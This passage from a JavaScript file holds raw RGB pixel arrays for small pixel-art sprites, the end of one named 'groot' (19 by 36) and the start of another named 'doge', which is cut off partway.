0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 255, 255, 255, 0, 0, 125, 0, 0, 125, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 0, 0, 125, 255, 160, 214, 255, 160, 214, 255, 160, 214, 255, 160, 214, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 227, 225, 6, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 255, 160, 214, 255, 160, 214, 255, 160, 214, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 160, 214, 255, 160, 214, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 227, 225, 6, 227, 225, 6, 227, 225, 6, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 0, 0, 125, 255, 255, 255, 255, 255, 255, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 227, 225, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 125, 0, 0, 125, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 0, 0, 125, 0, 0, 125, 0, 0, 125, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 0, 0, 125, 0, 0, 125, 255, 255, 255, 0, 0, 125, 255, 255, 255, 255, 255, 255, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 160, 214, 255, 255, 255, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 0, 0, 0, 255, 160, 214, 255, 255, 255, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 0, 0, 0, 255, 160, 214, 76, 81, 81, 0, 0, 125, 0, 0, 125, 0, 0, 125, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 227, 225, 6, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 227, 225, 6, 255, 253, 7, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 255, 253, 7, 0, 0, 0, 76, 81, 81, 255, 253, 7, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 227, 225, 6, 227, 225, 6, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 255, 253, 7, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 227, 225, 6, 227, 225, 6, 0, 0, 0, 255, 253, 7, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 227, 225, 6, 255, 253, 7, 255, 253, 7, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 255, 253, 7, 255, 253, 7, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 255, 253, 7, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 255, 253, 7, 255, 253, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 227, 225, 6, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 253, 7, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 253, 7, 255, 253, 7, 76, 81, 81, 255, 253, 7, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 227, 225, 6, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 76, 81, 81, 76, 81, 81, 76, 81, 81, 76, 81, 81, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255
];
groot.width = 19;
groot.height = 36;
var doge = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 203, 169, 255, 203, 169, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 203, 169, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 203, 169, 255, 203, 169, 255, 203, 169, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 203, 169, 255, 203, 169, 255, 203, 169, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 255, 142, 7, 